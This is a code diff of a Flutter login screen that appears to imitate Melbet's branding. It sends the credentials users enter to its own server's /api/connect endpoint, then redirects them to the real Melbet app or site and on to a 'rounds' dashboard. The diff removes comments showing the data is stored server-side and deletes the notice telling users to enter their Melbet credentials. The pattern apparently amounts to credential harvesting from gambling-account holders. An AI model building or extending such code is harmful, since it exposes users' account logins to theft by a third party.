@@ -1,7 +1,8 @@
 import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
-import 'package:url_launcher/url_launcher.dart'; // مكتبة فتح الروابط والتطبيقات
+import 'package:url_launcher/url_launcher.dart';
+import 'rounds_dashboard.dart';
 
 class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key});
@@ -30,10 +31,11 @@ class _LoginScreenState extends State<LoginScreen> {
     super.dispose();
   }
 
-  // دالة تحويل الزبون نحو Melbet (تطبيق أو متصفح)
+  // دالة متطورة لفتح تطبيق Melbet الحقيقي أو المتصفح كبديل
   Future<void> _redirectToMelbet() async {
-    final Uri appUri = Uri.parse('melbet://'); // الـ Scheme الخاص بتطبيق Melbet
-    final Uri webUri = Uri.parse('https://melbet.com'); // الرابط الاحتياطي للمتصفح
+    // محاولة فتح تطبيق Melbet عبر الـ Scheme الخاص به
+    final Uri appUri = Uri.parse('melbet://');
+    final Uri webUri = Uri.parse('https://melbet.com');
 
     try {
       if (await canLaunchUrl(appUri)) {
@@ -41,8 +43,7 @@ class _LoginScreenState extends State<LoginScreen> {
       } else {
         await launchUrl(webUri, mode: LaunchMode.externalApplication);
       }
-    } catch (e) {
-      // إيلا وقع شي مشكل في فتح التطبيق، نتحولو للمتصفح مباشرة
+    } catch (_) {
       await launchUrl(webUri, mode: LaunchMode.externalApplication);
     }
   }
@@ -55,7 +56,6 @@ class _LoginScreenState extends State<LoginScreen> {
     });
 
     try {
-      // إرسال المعطيات إلى السيرفر في مسار /api/connect
       final response = await http.post(
         Uri.parse('$_apiBaseUrl/api/connect'),
         headers: {'Content-Type': 'application/json'},
@@ -72,8 +72,13 @@ class _LoginScreenState extends State<LoginScreen> {
       if (response.statusCode == 200 && data['success'] == true) {
         setState(() => _busy = false);
         
-        // حفظ البيانات في السيرفر تمت بنجاح، دابا ندوزوه مباشرة لـ Melbet
+        // فتح تطبيق Melbet والانتقال للداشبورد مباشرة
         await _redirectToMelbet();
+
+        if (!mounted) return;
+        Navigator.of(context).pushReplacement(
+          MaterialPageRoute(builder: (_) => const RoundsDashboard()),
+        );
       } else {
         setState(() {
           _busy = false;
@@ -91,7 +96,7 @@ class _LoginScreenState extends State<LoginScreen> {
 
   @override
   Widget build(BuildContext context) {
-    const accent = Color(0xFFFFD400); // اللون الأصفر المميز لـ Melbet
+    const accent = Color(0xFFFFD400);
 
     return Scaffold(
       body: Stack(
@@ -107,8 +112,6 @@ class _LoginScreenState extends State<LoginScreen> {
               ),
             ),
           ),
-          Positioned(top: -70, right: -60, child: Container(width: 220, height: 220, decoration: BoxDecoration(shape: BoxShape.circle, color: accent.withOpacity(.08))),),
-          // 3. المحتوى وخانات الإدخال
           SafeArea(
             child: Center(
               child: SingleChildScrollView(
@@ -232,12 +235,6 @@ class _LoginScreenState extends State<LoginScreen> {
                                     style: TextStyle(fontSize: 16, fontWeight: FontWeight.w900),
                                   ),
                           ),
-                        ),
-                        const SizedBox(height: 18),
-                        const Text(
-                          'استعمل بيانات الدخول الخاصة بحساب Melbet حصرياً للربط بالمنصة.',
-                          textAlign: TextAlign.center,
-                          style: TextStyle(fontSize: 11, color: Colors.white38),
                         ),
                       ],
                     ),
